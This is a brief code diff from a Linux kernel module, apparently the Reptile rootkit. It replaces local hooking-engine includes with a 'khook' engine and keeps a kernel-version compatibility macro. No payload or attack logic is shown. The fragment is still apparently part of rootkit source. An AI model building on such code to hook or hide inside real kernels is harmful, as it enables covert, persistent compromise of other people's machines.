@@ -33,8 +33,7 @@
 #include <net/inet_sock.h>
 
 #include "config.h"
-#include "engine/engine.c"
-#include "engine/engine.h"
+#include "khook/engine.c"
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
 #define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
